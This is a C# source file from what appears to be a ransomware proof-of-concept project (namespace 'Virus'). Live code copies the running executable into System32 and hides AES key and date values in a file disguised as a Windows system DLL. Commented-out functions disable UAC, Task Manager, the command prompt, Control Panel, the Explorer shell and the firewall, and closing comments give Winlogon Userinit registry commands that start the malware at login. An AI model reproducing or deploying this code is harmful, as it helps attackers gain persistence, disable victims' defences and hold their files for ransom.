using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace Virus
{
    class RegHelpers
    {
        public static string DateFinder = "Date";
        public static string AESFinder = "Aes";
        public static string MySecretDllPath = "C:\\Windows\\System32\\Windows.Security.dll";

        //private static void DisableUAC(bool reset = false)   //user account control 
        //{
        //    RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        //    if (reset)
        //    {
        //        reg2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
        //    }
        //    else
        //    {
        //        reg2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
        //    }
        //    reg2.Close();
        //}
        //private static void DisableCMD(bool reset = false)
        //{
        //    RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
        //    if (reset && reg2.GetValue("DisableCMD") != null)
        //    {
        //        reg2.DeleteValue("DisableCMD");
        //    }
        //    else
        //    {
        //        reg2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
        //    }
        //    reg2.Close();
        //}
        //private static void DisableTaskMgr(bool reset = false)
        //{
        //    RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");

        //    if (reset && reg.GetValue("DisableTaskMgr") != null)
        //    {
        //        reg.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
        //    }
        //    else
        //    {
        //        reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
        //    }
        //    reg.Close();
        //}
        //private static void DisableControlPanel(bool reset = false)
        //{
        //    RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
        //    if (reset)
        //    {
        //        reg1.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
        //    }
        //    else
        //    {
        //        reg1.SetValue("NoCtrlDisp", 1, RegistryValueKind.DWord);
        //        reg1.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
        //    }
        //    reg1.Close();
        //}
        //private static bool DisableWallpaper()
        //{
        //    RegistryKey reg = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");

        //    if (reg.GetValue("Wallpaper").ToString() != "")
        //    {
        //        reg.SetValue("Wallpaper", "", RegistryValueKind.String);
        //    }
        //    else { return false; }
        //    reg.Close();
        //    return true;
        //}
        //private static bool DisableFileExplorer()
        //{
        //    RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

        //    if (reg.GetValue("Shell").ToString() != "")
        //    {
        //        reg.SetValue("Shell", "", RegistryValueKind.String);
        //    }
        //    else { return false; }
        //    reg.Close();
        //    return true;
        //}

        //private static void EnableCMD()
        //{
        //    DisableCMD(true);

        //}
        //private static void EnableTaskMgr()
        //{
        //    DisableTaskMgr(true);
        //}
        //private static void EnableControlPanel()
        //{
        //    DisableControlPanel(true);
        //}
        //private static void EnableUAC()
        //{
        //    DisableUAC(true);
        //}
        //private static bool EnableFileExplorer()
        //{
        //    RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

        //    if (reg.GetValue("Shell").ToString() == "")
        //    {
        //        reg.SetValue("Shell", "Explorer.exe", RegistryValueKind.String);
        //    }
        //    else { return false; }
        //    reg.Close();
        //    return true;
        //}

        public static bool SetInSecret(string valToSet, string finder)
        {
            File.AppendAllText(MySecretDllPath, $"\n{finder}={valToSet}");
            return true;
        }
        public static string GetFromSecret(string finder)
        {
            if (!File.Exists(MySecretDllPath))
            {
                File.Create(MySecretDllPath).Close();
            }
            foreach (var line in File.ReadAllLines(MySecretDllPath))
            {
                if (line.Contains(finder))
                {
                    return line.Replace($"{finder}=", "");
                }
            }
            return null;
        }
        public static void DeleteFromSecret(string finder)
        {
            var oldLines = File.ReadAllLines(MySecretDllPath);
            var newLines = oldLines.Where(line => !line.Contains(finder));
            System.IO.File.WriteAllLines(MySecretDllPath, newLines);
        }



        public static bool IsAvailableForAllUsers()
        {
            string pathStartUp = "C:\\Windows\\System32";
            if (!Directory.Exists(pathStartUp))
            {
                return false;
            }
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            if (exe == destiny)
            {
                return true;
            }
            return false;
        }
        public static bool MakeAvailableForAllUsers()
        {
            string pathStartUp = "C:\\Windows\\System32";
            if (!Directory.Exists(pathStartUp))
            {
                File.Create(pathStartUp).Close();

            }
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            if (exe != destiny)
            {
                var data = File.ReadAllBytes(exe);
                File.WriteAllBytes(destiny, data);
            }
            return true;



        }   //todo work on this

        //private static void DisableWindowsDefender()
        //{
        //    System.Diagnostics.Process process = new System.Diagnostics.Process();
        //    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        //    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        //    startInfo.FileName = "cmd.exe";
        //    startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state off";
        //    process.StartInfo = startInfo;
        //    process.Start();
        //}
        //private static void EnableWindowsDefender()
        //{
        //    System.Diagnostics.Process process = new System.Diagnostics.Process();
        //    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        //    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        //    startInfo.FileName = "cmd.exe";
        //    startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state on";
        //    process.StartInfo = startInfo;
        //    process.Start();
        //}


        //reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Hello"
    }   //reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Users\Rory Cox\source\repos\CSharp-Ransomware-POC (Github)\Virus\bin\Debug\Virus.exe"
}
